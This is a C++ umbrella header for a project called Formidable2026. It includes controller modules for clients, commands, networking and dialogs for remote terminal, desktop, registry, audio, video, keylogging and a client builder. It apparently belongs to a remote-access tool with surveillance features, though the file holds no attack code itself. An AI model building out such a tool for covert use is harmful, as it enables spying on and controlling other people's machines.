// Formidable2026Modules.h - 模块总入口 (建议作为预编译头 PCH 使用)
#pragma once

// =================================================================
// Core 模块 - 核心逻辑与管理
// =================================================================
#include "Master/Core/ClientManager.h"
#include "Master/Core/CommandHandler.h"

// =================================================================
// Network 模块 - 网络通信
// =================================================================
#include "Master/Network/NetworkManager.h"

// =================================================================
// UI 模块 - 对话框与图形界面
// =================================================================
#include "Master/UI/ProcessDialog.h"
#include "Master/UI/FileDialog.h"
#include "Master/UI/TerminalDialog.h"
#include "Master/UI/DesktopDialog.h"
#include "Master/UI/RegistryDialog.h"
#include "Master/UI/AudioDialog.h"
#include "Master/UI/VideoDialog.h"
#include "Master/UI/KeylogDialog.h"
#include "Master/UI/ServiceDialog.h"
#include "Master/UI/SettingsDialog.h"
#include "Master/UI/BuilderDialog.h"
#include "Master/UI/WindowDialog.h"
#include "Master/UI/ModuleDialog.h"

// =================================================================
// Utils 模块 - 辅助工具
// =================================================================
#include "Master/Utils/StringHelper.h"
#include "Master/Utils/CommonHelpers.h"

namespace Formidable {
    // 命名空间平坦化导出
    // 注意：在大型项目中，建议显式使用子命名空间以避免冲突
    namespace Core {}
    namespace Network {}
    namespace UI {}
    namespace Utils {}

    using namespace Core;
    using namespace Network;
    using namespace UI;
    using namespace Utils;
}
